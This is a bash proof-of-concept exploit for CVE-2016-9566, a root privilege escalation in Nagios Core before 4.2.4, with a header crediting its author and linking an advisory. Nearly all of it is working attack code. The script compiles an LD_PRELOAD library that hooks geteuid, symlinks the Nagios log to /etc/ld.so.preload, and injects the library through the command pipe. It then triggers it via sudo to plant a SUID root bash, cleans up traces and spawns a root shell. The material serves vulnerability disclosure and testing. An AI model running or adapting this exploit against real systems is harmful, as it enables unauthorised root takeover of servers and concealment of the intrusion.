#!/bin/bash
#
# Nagios Core < 4.2.4  Root Privilege Escalation PoC Exploit
# nagios-root-privesc.sh (ver. 1.0)
#
# CVE-2016-9566
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory
#
#
# [Info]
#
# This PoC exploit allows privilege escalation from 'nagios' system account, 
# or an account belonging to 'nagios' group, to root (root shell).
# Attackers could obtain such an account via exploiting another vulnerability,
# e.g. CVE-2016-9565 linked below.
#
# [Exploit usage]
#
# ./nagios-root-privesc.sh path_to_nagios.log 
#
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
#
# Video PoC:
# https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
#
# CVE-2016-9565:
# https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/nagiosrootsh"
PRIVESCLIB="/tmp/nagios_privesc_lib.so"
PRIVESCSRC="/tmp/nagios_privesc_lib.c"
SUIDBIN="/usr/bin/sudo"
commandfile='/usr/local/nagios/var/rw/nagios.cmd'

function cleanexit {
	# Cleanup 
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
	cleanexit 0
}

#intro 

echo -e "\033[94m \nNagios Core - Root Privilege Escalation PoC Exploit (CVE-2016-9566) \nnagios-root-privesc.sh (ver. 1.0)\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"

# Priv check
echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"
id | grep -q nagios
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as 'nagios' user or 'nagios' group ! Exiting.\n"
	exit 3
fi

# Set target paths
ERRORLOG="$1"
if [ ! -f "$ERRORLOG" ]; then
	echo -e "\n[!] Provided Nagios log path ($ERRORLOG) doesn't exist. Try again. E.g: \n"
	echo -e "./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log\n"
	exit 3
fi

# [ Exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the Nagios log file
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] The system appears to be exploitable (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"

{
# Wait for Nagios to get restarted
echo -ne "\n[+] Waiting for Nagios service to get restarted...\n"
echo -n "Do you want to shutdown the Nagios daemon to speed up the restart process? ;) [y/N] "
read THE_ANSWER
if [ "$THE_ANSWER" = "y" ]; then
	/usr/bin/printf "[%lu] SHUTDOWN_PROGRAM\n" `date +%s` > $commandfile
fi
sleep 3s
ps aux | grep -v grep | grep -i 'bin/nagios'
if [ $? -ne 0 ]; then
	echo -ne "\n[+] Nagios stopped. Shouldn't take long now... ;)\n"
fi
while :; do 
	sleep 1 2>/dev/null
	if [ -f /etc/ld.so.preload ]; then
		rm -f $ERRORLOG
		break;
	fi
done

echo -e "\n[+] Nagios restarted. The /etc/ld.so.preload file got created with the privileges: \n`ls -l /etc/ld.so.preload`"

# /etc/ld.so.preload should be owned by nagios:nagios at this point with perms:
# -rw-r--r-- 1 nagios nagios 
# Only 'nagios' user can write to it, but 'nagios' group can not.
# This is not ideal as in scenarios like CVE-2016-9565 we might be running as www-data:nagios user.
# We can bypass the lack of write perm on /etc/ld.so.preload by writing to Nagios external command file/pipe
# nagios.cmd, which is writable by 'nagios' group. We can use it to send a bogus command which will
# inject the path to our privesc library into the nagios.log file (i.e. the ld.so.preload file :)

sleep 3s 	# Wait for Nagios to create the nagios.cmd pipe
if [ ! -p $commandfile ]; then
	echo -e "\n[!] Nagios command pipe $commandfile does not exist!"
	exit 2
fi	
echo -e "\n[+] Injecting $PRIVESCLIB via the pipe nagios.cmd to bypass lack of write perm on ld.so.preload"
now=`date +%s`
/usr/bin/printf "[%lu] NAGIOS_GIVE_ME_ROOT_NOW!;; $PRIVESCLIB \n" $now > $commandfile
sleep 1s
grep -q "$PRIVESCLIB" /etc/ld.so.preload
if [ $? -eq 0 ]; then 
	echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload | grep "$PRIVESCLIB"`"
else
	echo -e "\n[!] Unable to inject the lib to /etc/ld.so.preload"
	exit 2
fi

} 2>/dev/null

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Triggering privesc code from $PRIVESCLIB by executing $SUIDBIN SUID binary"
sudo 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH | grep rws | grep -q root 2>/dev/null
if [ $? -eq 0 ]; then 
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mGot root via Nagios!\033[0m"
else
	echo -e "\n[!] Failed to get root: \n`ls -l $BACKDOORPATH`"
	cleanexit 2
fi

# Use the rootshell to perform cleanup that requires root privileges
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
rm -f $ERRORLOG
echo > $ERRORLOG

# Execute the rootshell
echo -e "\n[+] Nagios pwned. Spawning the rootshell $BACKDOORPATH now\n"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0

